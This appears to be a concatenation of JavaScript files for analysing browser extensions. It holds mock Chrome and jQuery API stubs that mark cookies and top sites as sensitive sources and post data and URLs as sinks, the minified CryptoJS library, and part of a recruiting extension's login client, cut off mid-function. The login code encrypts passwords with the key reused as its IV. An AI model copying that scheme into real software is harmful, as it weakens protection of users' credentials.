// original file:demos/bg_header.js

// port
function Port(info){
    if (info.includeTlsChannelId){
        this.includeTlsChannelId = info.includeTlsChannelId;
    }
    if (info.name){
        this.name = info.name;
    }
}

Port.prototype.onMessage.addListener = function(myCallback){
    RegisterFunc("bg_port_onMessage", myCallback);
};

Port.prototype.postMessage = function(msg){
    var eventName = 'bg_port_postMessage';
    var info =  {message:msg};
    TriggerEvent(eventName, info);
};

// tab
function Tab(){
    this.active = true;
    this.audible = true;
    this.autoDiscardable = true;
    this.discarded = true;
    this.favIconUrl = 'https://example.com/image.png';
    this.groupId = 1;
    this.height =  600;
    this.highlighted = true;
    this.id = 99;
    this.incognito = false;
    this.index = 2;
    this.mutedInfo = {muted:false};
    this.openerTabId = 1;
    this.pendingUrl = 'https://example2.com';
    this.pinned = true;
    this.sessionId = '23';
    this.status = 'complete';
    this.title = 'example';
    this.url = 'https://example.com';
    this.width =  800;
    this.windowId = 14;
}

// chrome
function Chrome(){}


Chrome.prototype.runtime.onConnect.addListener = function(myCallback) {
  RegisterFunc("bg_chrome_runtime_onConnect", myCallback);
};


Chrome.prototype.topSites.get = function(myCallback){
    var mostVisitedUrls_source = {title:'title', url:'url'};
    // mostVisitedUrls is sensitive data!
    // chrome_topSites_get_source(mostVisitedUrls);
    myCallback(mostVisitedUrls_source);
};

// chrome.tabs.sendMessage(tabId: number, message: any, options: object, responseCallback: function)
// Chrome.prototype.tabs.sendMessage = function(tabId, message, options, responseCallback){
//     var eventName = 'bg_chrome_tabs_sendMessage';
//     var info =  {tabId:99, message:message, options:options, responseCallback:responseCallback};
//     TriggerEvent(eventName, info);
// };
// 
Chrome.prototype.tabs.sendMessage = function(tabId, message, responseCallback){
    var eventName = 'bg_chrome_tabs_sendMessage';
    var info =  {tabId:tabId, message:message, responseCallback:responseCallback};
    TriggerEvent(eventName, info);
};


// chrome.cookies.get(details: CookieDetails, callback: function)
Chrome.prototype.cookies.get = function(details, callback){
    // details does not matter for now
    var cookie_source = {domain:'cookie_domain', expirationDate:2070, hostOnly:true, httpOnly: false, name:'cookie_name', path:'cookie_path',sameSite:'no_restriction', secure:true, session: true, storeId:'cookie_storeId', value: 'cookie_value' };
    // chrome_cookies_get_source(cookie_source);
    callback(cookie_source);
};

// chrome.cookies.getAll(details: object, callback: function)
Chrome.prototype.cookies.getAll = function(details, callback){
    // details does not matter for now
    var cookie_source = {domain:'cookie_domain', expirationDate:2070, hostOnly:true, httpOnly: false, name:'cookie_name', path:'cookie_path',sameSite:'no_restriction', secure:true, session: true, storeId:'cookie_storeId', value: 'cookie_value' };
    // assume there is only one cookie
    var cookies_source = [cookie_source];
    // chrome_cookies_getAll_source(cookies_source);
    callback(cookies_source);
};


// chrome.tabs.query(queryInfo: object, callback: function)
Chrome.prototype.tabs.query = function(queryInfo, callback){
    // queryInfo is to find corresponding tabs, ingore it now
    var tab = new Tab();
    var alltabs = [tab];
    callback(alltabs);
}

// the callback is called once a new tab is activated, we run the callback after all the others are set
Chrome.prototype.tabs.onActivated.addListener = function(myCallback){
    // var activeInfo = {tabId:99, windowId:80};
    // myCallback(activeInfo);
    RegisterFunc("bg_chrome_tabs_onActivated", myCallback);
}


function ActiveInfo(){
    this.tabId = 3;
    this.windowId = 1;
};



// Fired before sending an HTTP request
// chrome.webRequest.onBeforeSendHeaders.addListener(listener: function)
// MDN:
// browser.webRequest.onBeforeSendHeaders.addListener(
//   listener,             //  function
//   filter,               //  object
//   extraInfoSpec         //  optional array of strings
// )
Chrome.prototype.webRequest.onBeforeSendHeaders.addListener = function(myCallback, filter, extraInfoSpec){
    // var request_Headers = [{Content-Length: 348}, {Content-Length: 456}];
    // var details = {frameId = 123, initiator = 'onBeforeSendHeaders_initiator', 
    // method = 'Standard_HTTP_method', parentFrameId = -1, requestHeaders = request_Headers,
    // requestId = 'ID_of_the_request', tabId = 99, timeStamp = 321, type = 'main_frame', url = 'url'
    // };
    // myCallback(details);
    // RegisterFunc();
}

// myCallback:
// (message: any, sender: MessageSender, sendResponse: function) => {...}
// get message from chrome.runtime.sendMessage or chrome.tabs.sendMessage
Chrome.prototype.runtime.onMessage.addListener = function(myCallback) {
    RegisterFunc('bg_chrome_runtime_onMessage', myCallback);
};
MessageSender = function(){
    this.frameId = 123;
    this.guestProcessId=456;
    this.guestRenderFrameRoutingId = 109;
    this.id = 0;
    this.nativeApplication = 'nativeApplication';
    this.origin = 'back';
    this.tab = new Tab();
    this.tlsChannelId = 'tlsChannelId';
    this.url = 'url';
};
function sendResponse(message_back){
    var eventName = 'bg_chrome_runtime_onMessage_response';
    var info = {message: message_back};
    TriggerEvent(eventName, info);
};

// // Tab
// Tab = function(){
//     this.
// }

chrome = new Chrome();



/////////
// original file:demos/jquery_header.js

// the document and its elements are all objects

function Document_element(id, class_name, tag){
    this.id = id;
    this.class_name = class_name;
    this.tag = tag;
}
Document_element.prototype.contentWindow = new Window();
Document_element.prototype.createElement = function(tagname){
    var de = new Document_element(undefined, undefined, tagname);
    return de;
}



function Document(){}
Document.prototype.getElementById = function(id){
    var document_element = new Document_element(id);
};

Document.prototype.body.appendChild = function(){};

var document = new Document();


// $(this).hide() - hides the current element.
// $("p").hide() - hides all <p> elements.
// $(".test").hide() - hides all elements with class="test".
// $("#test").hide() - hides the element with id="test".
function $(a){
    // find element a in document
    // if a is an Array
    if (Array.isArray(a)){
        var array_in = a;
        a = undefined;
    }
    else{
        // $("#test")
        if (a[0] == '#'){
            var document_element = new Document_element(a.substring(1,));
            // document.push(document_element);
            // document[a] = document_element;
        }
        // $(".test")
        else if(a[0] == '.'){
            var document_element = new Document_element(undefined, a.substring(1,));
            // document.push(document_element);
        }
        // document
        else if (a == document){
            var document_element = document;
        }
        // $("p")
        else{
            var document_element = new Document_element(undefined, undefined,a.substring(1,));
            // document.push(document_element);
        }
        var array_in = [document_element];
    }
    return new JQ_obj(a, array_in);
};


// jqXHR
// jQuery.get( url [, data ] [, success ] [, dataType ] )
// data: Type: PlainObject or String
// success: Type: Function( PlainObject data, String textStatus, jqXHR jqXHR )
// dataType: Type: String
$.get = function(url , success){
    var responseText = 'data_from_url_by_get';
    jQuery_get_source(responseText);
    jQuery_get_url_sink(url);
    success(responseText);
    return new jqXHR();
}
// jQuery.post( url [, data ] [, success ] [, dataType ] )
$.post = function( url , data, success){
    var responseText = 'data_from_url_by_post';
    jQuery_post_source(responseText);
    jQuery_post_data_sink(data);
    jQuery_post_url_sink(url);
    success(responseText);
    return new jqXHR();
}
jqXHR = function(){

}
// jqXHR.fail(function( jqXHR, textStatus, errorThrown ) {});
jqXHR.prototype.fail = function(callback){
    // do nothing
    return this;
}
// jqXHR.done(function( data, textStatus, jqXHR ) {});
// done == success
jqXHR.prototype.done = function(callback){
    callback();
    return this;
}
// jqXHR.always(function( data|jqXHR, textStatus, jqXHR|errorThrown ) {});
jqXHR.prototype.always = function(callback){
    callback();
    return this;
}

JQ_obj = function(a, array_in){
    this.selector = a;
    this.context = document;
    var i=0;
    for (i=0; i<array_in.length; i++){
        this[i] = array_in[i];
    }
    this.length = array_in.length;
}

JQ_obj.prototype.val = function(first_argument) {
    if (arguments.length>0){
        JQ_obj_val_sink(first_argument);
        this[0].value = first_argument;
    }
    else{
        // return value of x
    }
};

JQ_obj.prototype.html = function(first_argument) {
    if (arguments.length >0){
        JQ_obj_html_sink(first_argument);
        this[0].html = first_argument;
    }
    else{
        // return html of x
    }
};

JQ_obj.prototype.ready = function(first_argument) {
    if (this[0]==document){
        first_argument();
    }  
};

JQ_obj.prototype.remove = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.focus = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.click = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.attr = function(first_argument, second_argument) {
    this[0].first_argument = second_argument;
};

JQ_obj.prototype.find = function(first_argument) {
    var document_element = new Document_element();
    return new JQ_obj(undefined, document_element);
};

JQ_obj.prototype.filter = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.keyup = function(first_argument) {
    first_argument();
};

JQ_obj.prototype.each = function(first_argument) {
    // for (var i=0; i<this.length; i++){
    //     first_argument.call(this[i]);
    // }
    first_argument.call(this[0]);
};


// jQuery.extend( target, object1 [, objectN ] )
$.extend = function(obj1, obj2){
    for (var key in obj2){
        obj1[key] = obj2[key];
    }
}

// jQuery.extend( [deep ], target, object1 [, objectN ] ) deep copy

function Event(type){
    this.type = type;
}





// original file:demos/jianlibao/js/libs/crypto-js-aes.min.js

!function(a,b){"object"==typeof exports?module.exports=exports=b():"function"==typeof define&&define.amd?define([],b):a.CryptoJS=b()}(this,function(){var a=a||function(a,b){var c={},d=c.lib={},e=d.Base=function(){function a(){}return{extend:function(b){a.prototype=this;var c=new a;return b&&c.mixIn(b),c.hasOwnProperty("init")||(c.init=function(){c.$super.init.apply(this,arguments)}),c.init.prototype=c,c.$super=this,c},create:function(){var a=this.extend();return a.init.apply(a,arguments),a},init:function(){},mixIn:function(a){for(var b in a)a.hasOwnProperty(b)&&(this[b]=a[b]);a.hasOwnProperty("toString")&&(this.toString=a.toString)},clone:function(){return this.init.prototype.extend(this)}}}(),f=d.WordArray=e.extend({init:function(a,c){a=this.words=a||[],c!=b?this.sigBytes=c:this.sigBytes=4*a.length},toString:function(a){return(a||h).stringify(this)},concat:function(a){var f,g,b=this.words,c=a.words,d=this.sigBytes,e=a.sigBytes;if(this.clamp(),d%4)for(f=0;e>f;f++)g=c[f>>>2]>>>24-f%4*8&255,b[d+f>>>2]|=g<<24-(d+f)%4*8;else for(f=0;e>f;f+=4)b[d+f>>>2]=c[f>>>2];return this.sigBytes+=e,this},clamp:function(){var b=this.words,c=this.sigBytes;b[c>>>2]&=4294967295<<32-c%4*8,b.length=a.ceil(c/4)},clone:function(){var a=e.clone.call(this);return a.words=this.words.slice(0),a},random:function(b){var c,d,e,g,h;for(d=[],e=function(b){var b=b,c=987654321,d=4294967295;return function(){c=36969*(65535&c)+(c>>16)&d,b=18e3*(65535&b)+(b>>16)&d;var e=(c<<16)+b&d;return e/=4294967296,e+=.5,e*(a.random()>.5?1:-1)}},g=0;b>g;g+=4)h=e(4294967296*(c||a.random())),c=987654071*h(),d.push(4294967296*h()|0);return new f.init(d,b)}}),g=c.enc={},h=g.Hex={stringify:function(a){var b,c,d,e,f;for(b=a.words,c=a.sigBytes,d=[],e=0;c>e;e++)f=b[e>>>2]>>>24-e%4*8&255,d.push((f>>>4).toString(16)),d.push((15&f).toString(16));return d.join("")},parse:function(a){for(var b=a.length,c=[],d=0;b>d;d+=2)c[d>>>3]|=parseInt(a.substr(d,2),16)<<24-d%8*4;return new f.init(c,b/2)}},i=g.Latin1={stringify:function(a){var b,c,d,e,f;for(b=a.words,c=a.sigBytes,d=[],e=0;c>e;e++)f=b[e>>>2]>>>24-e%4*8&255,d.push(String.fromCharCode(f));return d.join("")},parse:function(a){for(var b=a.length,c=[],d=0;b>d;d++)c[d>>>2]|=(255&a.charCodeAt(d))<<24-d%4*8;return new f.init(c,b)}},j=g.Utf8={stringify:function(a){try{return decodeURIComponent(escape(i.stringify(a)))}catch(b){throw new Error("Malformed UTF-8 data")}},parse:function(a){return i.parse(unescape(encodeURIComponent(a)))}},k=d.BufferedBlockAlgorithm=e.extend({reset:function(){this._data=new f.init,this._nDataBytes=0},_append:function(a){"string"==typeof a&&(a=j.parse(a)),this._data.concat(a),this._nDataBytes+=a.sigBytes},_process:function(b){var j,k,l,m,c=this._data,d=c.words,e=c.sigBytes,g=this.blockSize,h=4*g,i=e/h;if(i=b?a.ceil(i):a.max((0|i)-this._minBufferSize,0),j=i*g,k=a.min(4*j,e),j){for(l=0;j>l;l+=g)this._doProcessBlock(d,l);m=d.splice(0,j),c.sigBytes-=k}return new f.init(m,k)},clone:function(){var a=e.clone.call(this);return a._data=this._data.clone(),a},_minBufferSize:0}),l=(d.Hasher=k.extend({cfg:e.extend(),init:function(a){this.cfg=this.cfg.extend(a),this.reset()},reset:function(){k.reset.call(this),this._doReset()},update:function(a){return this._append(a),this._process(),this},finalize:function(a){a&&this._append(a);var b=this._doFinalize();return b},blockSize:16,_createHelper:function(a){return function(b,c){return new a.init(c).finalize(b)}},_createHmacHelper:function(a){return function(b,c){return new l.HMAC.init(a,c).finalize(b)}}}),c.algo={});return c}(Math);return a}),function(a,b){"object"==typeof exports?module.exports=exports=b(require("./core")):"function"==typeof define&&define.amd?define(["./core"],b):b(a.CryptoJS)}(this,function(a){return function(){var b=a,c=b.lib,d=c.WordArray,e=b.enc;e.Base64={stringify:function(a){var e,f,g,h,i,j,k,l,b=a.words,c=a.sigBytes,d=this._map;for(a.clamp(),e=[],f=0;c>f;f+=3)for(g=b[f>>>2]>>>24-f%4*8&255,h=b[f+1>>>2]>>>24-(f+1)%4*8&255,i=b[f+2>>>2]>>>24-(f+2)%4*8&255,j=g<<16|h<<8|i,k=0;4>k&&c>f+.75*k;k++)e.push(d.charAt(j>>>6*(3-k)&63));if(l=d.charAt(64))for(;e.length%4;)e.push(l);return e.join("")},parse:function(a){var f,g,h,i,j,k,l,b=a.length,c=this._map,e=c.charAt(64);for(e&&(f=a.indexOf(e),-1!=f&&(b=f)),g=[],h=0,i=0;b>i;i++)i%4&&(j=c.indexOf(a.charAt(i-1))<<i%4*2,k=c.indexOf(a.charAt(i))>>>6-i%4*2,l=j|k,g[h>>>2]|=l<<24-h%4*8,h++);return d.create(g,h)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="}}(),a.enc.Base64}),function(a,b){"object"==typeof exports?module.exports=exports=b(require("./core")):"function"==typeof define&&define.amd?define(["./core"],b):b(a.CryptoJS)}(this,function(a){return function(b){function c(a,b,c,d,e,f,g){var h=a+(b&c|~b&d)+e+g;return(h<<f|h>>>32-f)+b}function d(a,b,c,d,e,f,g){var h=a+(b&d|c&~d)+e+g;return(h<<f|h>>>32-f)+b}function e(a,b,c,d,e,f,g){var h=a+(b^c^d)+e+g;return(h<<f|h>>>32-f)+b}function f(a,b,c,d,e,f,g){var h=a+(c^(b|~d))+e+g;return(h<<f|h>>>32-f)+b}var m,g=a,h=g.lib,i=h.WordArray,j=h.Hasher,k=g.algo,l=[];!function(){for(var a=0;64>a;a++)l[a]=4294967296*b.abs(b.sin(a+1))|0}(),m=k.MD5=j.extend({_doReset:function(){this._hash=new i.init([1732584193,4023233417,2562383102,271733878])},_doProcessBlock:function(a,b){var g,h,i,j,k,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E;for(g=0;16>g;g++)h=b+g,i=a[h],a[h]=16711935&(i<<8|i>>>24)|4278255360&(i<<24|i>>>8);j=this._hash.words,k=a[b+0],m=a[b+1],n=a[b+2],o=a[b+3],p=a[b+4],q=a[b+5],r=a[b+6],s=a[b+7],t=a[b+8],u=a[b+9],v=a[b+10],w=a[b+11],x=a[b+12],y=a[b+13],z=a[b+14],A=a[b+15],B=j[0],C=j[1],D=j[2],E=j[3],B=c(B,C,D,E,k,7,l[0]),E=c(E,B,C,D,m,12,l[1]),D=c(D,E,B,C,n,17,l[2]),C=c(C,D,E,B,o,22,l[3]),B=c(B,C,D,E,p,7,l[4]),E=c(E,B,C,D,q,12,l[5]),D=c(D,E,B,C,r,17,l[6]),C=c(C,D,E,B,s,22,l[7]),B=c(B,C,D,E,t,7,l[8]),E=c(E,B,C,D,u,12,l[9]),D=c(D,E,B,C,v,17,l[10]),C=c(C,D,E,B,w,22,l[11]),B=c(B,C,D,E,x,7,l[12]),E=c(E,B,C,D,y,12,l[13]),D=c(D,E,B,C,z,17,l[14]),C=c(C,D,E,B,A,22,l[15]),B=d(B,C,D,E,m,5,l[16]),E=d(E,B,C,D,r,9,l[17]),D=d(D,E,B,C,w,14,l[18]),C=d(C,D,E,B,k,20,l[19]),B=d(B,C,D,E,q,5,l[20]),E=d(E,B,C,D,v,9,l[21]),D=d(D,E,B,C,A,14,l[22]),C=d(C,D,E,B,p,20,l[23]),B=d(B,C,D,E,u,5,l[24]),E=d(E,B,C,D,z,9,l[25]),D=d(D,E,B,C,o,14,l[26]),C=d(C,D,E,B,t,20,l[27]),B=d(B,C,D,E,y,5,l[28]),E=d(E,B,C,D,n,9,l[29]),D=d(D,E,B,C,s,14,l[30]),C=d(C,D,E,B,x,20,l[31]),B=e(B,C,D,E,q,4,l[32]),E=e(E,B,C,D,t,11,l[33]),D=e(D,E,B,C,w,16,l[34]),C=e(C,D,E,B,z,23,l[35]),B=e(B,C,D,E,m,4,l[36]),E=e(E,B,C,D,p,11,l[37]),D=e(D,E,B,C,s,16,l[38]),C=e(C,D,E,B,v,23,l[39]),B=e(B,C,D,E,y,4,l[40]),E=e(E,B,C,D,k,11,l[41]),D=e(D,E,B,C,o,16,l[42]),C=e(C,D,E,B,r,23,l[43]),B=e(B,C,D,E,u,4,l[44]),E=e(E,B,C,D,x,11,l[45]),D=e(D,E,B,C,A,16,l[46]),C=e(C,D,E,B,n,23,l[47]),B=f(B,C,D,E,k,6,l[48]),E=f(E,B,C,D,s,10,l[49]),D=f(D,E,B,C,z,15,l[50]),C=f(C,D,E,B,q,21,l[51]),B=f(B,C,D,E,x,6,l[52]),E=f(E,B,C,D,o,10,l[53]),D=f(D,E,B,C,v,15,l[54]),C=f(C,D,E,B,m,21,l[55]),B=f(B,C,D,E,t,6,l[56]),E=f(E,B,C,D,A,10,l[57]),D=f(D,E,B,C,r,15,l[58]),C=f(C,D,E,B,y,21,l[59]),B=f(B,C,D,E,p,6,l[60]),E=f(E,B,C,D,w,10,l[61]),D=f(D,E,B,C,n,15,l[62]),C=f(C,D,E,B,u,21,l[63]),j[0]=j[0]+B|0,j[1]=j[1]+C|0,j[2]=j[2]+D|0,j[3]=j[3]+E|0},_doFinalize:function(){var f,g,h,i,j,k,a=this._data,c=a.words,d=8*this._nDataBytes,e=8*a.sigBytes;for(c[e>>>5]|=128<<24-e%32,f=b.floor(d/4294967296),g=d,c[(e+64>>>9<<4)+15]=16711935&(f<<8|f>>>24)|4278255360&(f<<24|f>>>8),c[(e+64>>>9<<4)+14]=16711935&(g<<8|g>>>24)|4278255360&(g<<24|g>>>8),a.sigBytes=4*(c.length+1),this._process(),h=this._hash,i=h.words,j=0;4>j;j++)k=i[j],i[j]=16711935&(k<<8|k>>>24)|4278255360&(k<<24|k>>>8);return h},clone:function(){var a=j.clone.call(this);return a._hash=this._hash.clone(),a}}),g.MD5=j._createHelper(m),g.HmacMD5=j._createHmacHelper(m)}(Math),a.MD5}),function(a,b,c){"object"==typeof exports?module.exports=exports=b(require("./core"),require("./sha1"),require("./hmac")):"function"==typeof define&&define.amd?define(["./core","./sha1","./hmac"],b):b(a.CryptoJS)}(this,function(a){return function(){var b=a,c=b.lib,d=c.Base,e=c.WordArray,f=b.algo,g=f.MD5,h=f.EvpKDF=d.extend({cfg:d.extend({keySize:4,hasher:g,iterations:1}),init:function(a){this.cfg=this.cfg.extend(a)},compute:function(a,b){var c,d,f,g,h,i,j,k;for(c=this.cfg,d=c.hasher.create(),f=e.create(),g=f.words,h=c.keySize,i=c.iterations;g.length<h;){for(j&&d.update(j),j=d.update(a).finalize(b),d.reset(),k=1;i>k;k++)j=d.finalize(j),d.reset();f.concat(j)}return f.sigBytes=4*h,f}});b.EvpKDF=function(a,b,c){return h.create(c).compute(a,b)}}(),a.EvpKDF}),function(a,b){"object"==typeof exports?module.exports=exports=b(require("./core")):"function"==typeof define&&define.amd?define(["./core"],b):b(a.CryptoJS)}(this,function(a){a.lib.Cipher||function(b){var c=a,d=c.lib,e=d.Base,f=d.WordArray,g=d.BufferedBlockAlgorithm,h=c.enc,i=(h.Utf8,h.Base64),j=c.algo,k=j.EvpKDF,l=d.Cipher=g.extend({cfg:e.extend(),createEncryptor:function(a,b){return this.create(this._ENC_XFORM_MODE,a,b)},createDecryptor:function(a,b){return this.create(this._DEC_XFORM_MODE,a,b)},init:function(a,b,c){this.cfg=this.cfg.extend(c),this._xformMode=a,this._key=b,this.reset()},reset:function(){g.reset.call(this),this._doReset()},process:function(a){return this._append(a),this._process()},finalize:function(a){a&&this._append(a);var b=this._doFinalize();return b},keySize:4,ivSize:4,_ENC_XFORM_MODE:1,_DEC_XFORM_MODE:2,_createHelper:function(){function a(a){return"string"==typeof a?x:u}return function(b){return{encrypt:function(c,d,e){return a(d).encrypt(b,c,d,e)},decrypt:function(c,d,e){return a(d).decrypt(b,c,d,e)}}}}()}),m=(d.StreamCipher=l.extend({_doFinalize:function(){var a=this._process(!0);return a},blockSize:1}),c.mode={}),n=d.BlockCipherMode=e.extend({createEncryptor:function(a,b){return this.Encryptor.create(a,b)},createDecryptor:function(a,b){return this.Decryptor.create(a,b)},init:function(a,b){this._cipher=a,this._iv=b}}),o=m.CBC=function(){function a(a,c,d){var f,g,e=this._iv;for(e?(f=e,this._iv=b):f=this._prevBlock,g=0;d>g;g++)a[c+g]^=f[g]}var c=n.extend();return c.Encryptor=c.extend({processBlock:function(b,c){var d=this._cipher,e=d.blockSize;a.call(this,b,c,e),d.encryptBlock(b,c),this._prevBlock=b.slice(c,c+e)}}),c.Decryptor=c.extend({processBlock:function(b,c){var d=this._cipher,e=d.blockSize,f=b.slice(c,c+e);d.decryptBlock(b,c),a.call(this,b,c,e),this._prevBlock=f}}),c}(),p=c.pad={},q=p.Pkcs7={pad:function(a,b){var c,d,e,g,h,i;for(c=4*b,d=c-a.sigBytes%c,e=d<<24|d<<16|d<<8|d,g=[],h=0;d>h;h+=4)g.push(e);i=f.create(g,d),a.concat(i)},unpad:function(a){var b=255&a.words[a.sigBytes-1>>>2];a.sigBytes-=b}},r=(d.BlockCipher=l.extend({cfg:l.cfg.extend({mode:o,padding:q}),reset:function(){var a,b,c,d;l.reset.call(this),a=this.cfg,b=a.iv,c=a.mode,this._xformMode==this._ENC_XFORM_MODE?d=c.createEncryptor:(d=c.createDecryptor,this._minBufferSize=1),this._mode=d.call(c,this,b&&b.words)},_doProcessBlock:function(a,b){this._mode.processBlock(a,b)},_doFinalize:function(){var b,a=this.cfg.padding;return this._xformMode==this._ENC_XFORM_MODE?(a.pad(this._data,this.blockSize),b=this._process(!0)):(b=this._process(!0),a.unpad(b)),b},blockSize:4}),d.CipherParams=e.extend({init:function(a){this.mixIn(a)},toString:function(a){return(a||this.formatter).stringify(this)}})),s=c.format={},t=s.OpenSSL={stringify:function(a){var d,b=a.ciphertext,c=a.salt;return d=c?f.create([1398893684,1701076831]).concat(c).concat(b):b,d.toString(i)},parse:function(a){var d,b=i.parse(a),c=b.words;return 1398893684==c[0]&&1701076831==c[1]&&(d=f.create(c.slice(2,4)),c.splice(0,4),b.sigBytes-=16),r.create({ciphertext:b,salt:d})}},u=d.SerializableCipher=e.extend({cfg:e.extend({format:t}),encrypt:function(a,b,c,d){d=this.cfg.extend(d);var e=a.createEncryptor(c,d),f=e.finalize(b),g=e.cfg;return r.create({ciphertext:f,key:c,iv:g.iv,algorithm:a,mode:g.mode,padding:g.padding,blockSize:a.blockSize,formatter:d.format})},decrypt:function(a,b,c,d){d=this.cfg.extend(d),b=this._parse(b,d.format);var e=a.createDecryptor(c,d).finalize(b.ciphertext);return e},_parse:function(a,b){return"string"==typeof a?b.parse(a,this):a}}),v=c.kdf={},w=v.OpenSSL={execute:function(a,b,c,d){d||(d=f.random(8));var e=k.create({keySize:b+c}).compute(a,d),g=f.create(e.words.slice(b),4*c);return e.sigBytes=4*b,r.create({key:e,iv:g,salt:d})}},x=d.PasswordBasedCipher=u.extend({cfg:u.cfg.extend({kdf:w}),encrypt:function(a,b,c,d){var e,f;return d=this.cfg.extend(d),e=d.kdf.execute(c,a.keySize,a.ivSize),d.iv=e.iv,f=u.encrypt.call(this,a,b,e.key,d),f.mixIn(e),f},decrypt:function(a,b,c,d){var e,f;return d=this.cfg.extend(d),b=this._parse(b,d.format),e=d.kdf.execute(c,a.keySize,a.ivSize,b.salt),d.iv=e.iv,f=u.decrypt.call(this,a,b,e.key,d)}})}()}),function(a,b,c){"object"==typeof exports?module.exports=exports=b(require("./core"),require("./enc-base64"),require("./md5"),require("./evpkdf"),require("./cipher-core")):"function"==typeof define&&define.amd?define(["./core","./enc-base64","./md5","./evpkdf","./cipher-core"],b):b(a.CryptoJS)}(this,function(a){return function(){var p,q,b=a,c=b.lib,d=c.BlockCipher,e=b.algo,f=[],g=[],h=[],i=[],j=[],k=[],l=[],m=[],n=[],o=[];!function(){var a,b,c,d,e,p,q,r,s;for(a=[],b=0;256>b;b++)128>b?a[b]=b<<1:a[b]=b<<1^283;for(c=0,d=0,b=0;256>b;b++)e=d^d<<1^d<<2^d<<3^d<<4,e=e>>>8^255&e^99,f[c]=e,g[e]=c,p=a[c],q=a[p],r=a[q],s=257*a[e]^16843008*e,h[c]=s<<24|s>>>8,i[c]=s<<16|s>>>16,j[c]=s<<8|s>>>24,k[c]=s,s=16843009*r^65537*q^257*p^16843008*c,l[e]=s<<24|s>>>8,m[e]=s<<16|s>>>16,n[e]=s<<8|s>>>24,o[e]=s,c?(c=p^a[a[a[r^p]]],d^=a[a[d]]):c=d=1}(),p=[0,1,2,4,8,16,32,64,128,27,54],q=e.AES=d.extend({_doReset:function(){var a,b,c,d,e,g,h,i,j,k;for(a=this._key,b=a.words,c=a.sigBytes/4,d=this._nRounds=c+6,e=4*(d+1),g=this._keySchedule=[],h=0;e>h;h++)c>h?g[h]=b[h]:(i=g[h-1],h%c?c>6&&h%c==4&&(i=f[i>>>24]<<24|f[i>>>16&255]<<16|f[i>>>8&255]<<8|f[255&i]):(i=i<<8|i>>>24,i=f[i>>>24]<<24|f[i>>>16&255]<<16|f[i>>>8&255]<<8|f[255&i],i^=p[h/c|0]<<24),g[h]=g[h-c]^i);for(j=this._invKeySchedule=[],k=0;e>k;k++)h=e-k,i=k%4?g[h]:g[h-4],4>k||4>=h?j[k]=i:j[k]=l[f[i>>>24]]^m[f[i>>>16&255]]^n[f[i>>>8&255]]^o[f[255&i]]},encryptBlock:function(a,b){this._doCryptBlock(a,b,this._keySchedule,h,i,j,k,f)},decryptBlock:function(a,b){var c=a[b+1];a[b+1]=a[b+3],a[b+3]=c,this._doCryptBlock(a,b,this._invKeySchedule,l,m,n,o,g),c=a[b+1],a[b+1]=a[b+3],a[b+3]=c},_doCryptBlock:function(a,b,c,d,e,f,g,h){var i,j,k,l,m,n,o,p,q,r,s;for(i=this._nRounds,j=a[b]^c[0],k=a[b+1]^c[1],l=a[b+2]^c[2],m=a[b+3]^c[3],n=4,o=1;i>o;o++)p=d[j>>>24]^e[k>>>16&255]^f[l>>>8&255]^g[255&m]^c[n++],q=d[k>>>24]^e[l>>>16&255]^f[m>>>8&255]^g[255&j]^c[n++],r=d[l>>>24]^e[m>>>16&255]^f[j>>>8&255]^g[255&k]^c[n++],s=d[m>>>24]^e[j>>>16&255]^f[k>>>8&255]^g[255&l]^c[n++],j=p,k=q,l=r,m=s;p=(h[j>>>24]<<24|h[k>>>16&255]<<16|h[l>>>8&255]<<8|h[255&m])^c[n++],q=(h[k>>>24]<<24|h[l>>>16&255]<<16|h[m>>>8&255]<<8|h[255&j])^c[n++],r=(h[l>>>24]<<24|h[m>>>16&255]<<16|h[j>>>8&255]<<8|h[255&k])^c[n++],s=(h[m>>>24]<<24|h[j>>>16&255]<<16|h[k>>>8&255]<<8|h[255&l])^c[n++],a[b]=p,a[b+1]=q,a[b+2]=r,a[b+3]=s},keySize:8}),b.AES=d._createHelper(q)}(),a.AES});
// original file:demos/jianlibao/js/bg/openapi.js

function DayeeAPI(appKey, serverBaseUrl) {
	var self = this;
	self.appKey = appKey;
	self.serverBaseUrl = serverBaseUrl;
	self.commomServerBaseUrl = serverBaseUrl;
}

DayeeAPI.prototype = {

	"logOff":function(callback){
		var self=this;
		self.token=0;
		callback();
	},
	"checkLogin":function(callback){
		var self=this;
		if (self.token) {
			callback({
				code:true,
				data:{resumeWhereabouts:self.resumeWhereabouts,channellist:self.channellist,ischeckRepeatResume:self.ischeckRepeatResume,applyStatus:self.applyStatus,showRelatedResume:self.showRelatedResume}
			});
		} else {
			callback({code:false,data:{}});
		}
	},"changeDefaultChannel": function(args, callback) {
        var self=this;
        if (self.token && self.channellist) {
          var tar =  self.channellist[args.channelDicId]
			var flag = false
			$.each(tar,function (i, e) {
				if(e.key == args.channelId){
					e.select = true
					flag = true
				}
            })
			if(flag){
                $.each(tar,function (i, e) {
                    if(e.key != args.channelId) {
                        e.select = false
                    }
                })
			}

        }
	},"login": function(args, callback) {
		var self = this;
		//登录接口，使用用户身份登录
		var returnInfoList = "resumeWhereabouts,channellist,token,serverBaseUrl,ischeckRepeatResume,showRelatedResume,applyStatus".split(",");
		var keys = CryptoJS.enc.Utf8.parse(self.appKey.slice(0, 16));
		var pwd = CryptoJS.AES.encrypt(args.password, keys, {iv: keys,mode: CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7}).toString();
		var parms = {
			corpCode: args.corpCode,
			userName: args.userName,
			password: pwd,
			returnInfoList:returnInfoList,
			autoFill:args.autoFill
		};
		$.each(returnInfoList,function(i,item){
			parms["returnInfoList["+i+"]"] = item;
		});

		$.each(args.channelDicIds,function(i,item){
			parms["channelDicIdList["+i+"]"] = item;
		});
		var settings= {
	         type:"post",
	         url:args.loginUrl,
	         dataType: "json",
			 data: parms,
	        success: function(result){
				if ('00' == result.code) {
					var content = JSON.parse(result.content);
					self.corpCode = args.corpCode;
					self.userName  = args.userName;
					$.each(returnInfoList,function(i,item){
						if (content[item]) {
							self[item] = content[item];
						} else if('serverBaseUrl' == item) {
							self[item] = self['commomServerBaseUrl'];
						} else {
							delete self[item];
						}
					});
					callback({code: 200,data: content});
				} else {
					callback({code: 500});
				}
	         },
	         error:function(result){
